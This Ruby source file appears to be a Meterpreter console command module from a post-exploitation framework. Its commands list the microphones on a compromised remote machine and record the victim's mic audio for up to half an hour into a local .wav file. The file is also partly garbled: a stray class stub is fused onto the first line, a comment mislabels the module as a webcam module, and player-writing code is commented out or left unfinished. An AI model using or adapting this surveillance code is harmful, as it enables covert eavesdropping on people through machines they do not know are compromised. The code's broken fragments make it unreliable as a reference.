class Mic
end# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
  module Post
    module Meterpreter
      module Ui

###
#
# Webcam - Capture video from the remote system
#
###
        class Console::CommandDispatcher::Stdapi::Mic
          Klass = Console::CommandDispatcher::Stdapi::Mic

          include Console::CommandDispatcher

          #
          # List of supported commands.
          #
          def commands
            {
                'channel_create_stdapi_net_mic_broadcast' => 'Play an audio stream from the specified mic',
                'stdapi_sys_audio_get_interfaces' => 'list all audio interfaces'
            }
          end

          #
          # Name for this dispatcher
          #
          def name
            "Stdapi: Mic"
          end

          def cmd_stdapi_sys_audio_get_interfaces
            client.mic.mic_list
            if client.mic.mic_list.length == 0
              print_error("No mics were found")
              return
            end

            client.mic.mic_list.each_with_index do |name, indx|
              print_line("#{indx + 1}: #{name}")
            end
          end

          def cmd_channel_create_stdapi_net_mic_broadcast

            print_status("Streaming mic audio channel...")

            # begin
              #response, audio_channel = client.mic.mic_start
              #mic_started = true
              # ::Timeout.timeout(10000) do
              #   while client do
              #     audio_channel.listen
              #   end
              # end
            # rescue ::Timeout::Error
            # ensure
            #   client.mic.mic_stop if mic_started
            # end

            if client.mic.mic_list.length == 0
              print_error("Target does not have a mic")
              return
            end

            print_status("Starting...")
            stream_path = Rex::Text.rand_text_alpha(8) + ".wav"
            player_path = Rex::Text.rand_text_alpha(8) + ".html"
            duration = 1800
            quality  = 50
            view     = true
            index    = 1

            html = stream_path

            # ::File.open(player_path, 'wb') do |f|
            #   f.write(html)
            # end
            if view
              print_status("Audio File: #{stream_path}")
              #Rex::Compat.open_file(player_path)
            else
              print_status("Please open the player manually with a browser: #{player_path}")
            end

            print_status("Streaming...")
            begin
              client.mic.mic_start(index)
              mic_started = true
              ::Timeout.timeout(duration) do
                while client do
                  data = client.mic.mic_get_frame(quality)
                  if data
                    ::File.open(stream_path, 'a') do |f|
                      f.write(data)
                    end
                    data = nil
                  end
                end
              end
            rescue ::Timeout::Error
            ensure
              client.mic.mic_stop if mic_started
            end
          end
        end
      end
    end
  end
end
